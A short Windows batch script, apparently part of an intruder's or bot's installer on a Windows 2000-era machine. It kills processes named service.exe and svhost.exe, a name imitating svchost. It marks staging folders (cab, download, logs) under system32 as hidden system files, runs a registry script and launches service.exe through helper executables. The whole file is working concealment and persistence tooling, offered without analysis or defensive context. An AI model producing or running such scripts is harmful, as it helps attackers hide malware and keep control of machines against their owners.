@echo off
back.exe pv.exe -kf service.exe
back.exe pv.exe -kf svhost.exe
back.exe pv.exe -kf svhost.exe
back.exe pv.exe -kf svhost.exe
attrib +a +h +s c:\winnt\system32\cab
attrib +a +h +s c:\winnt\system32\cab\download
attrib +a +h +s c:\winnt\system32\cab\logs
back.exe regadd.bat
back32.exe service.exe
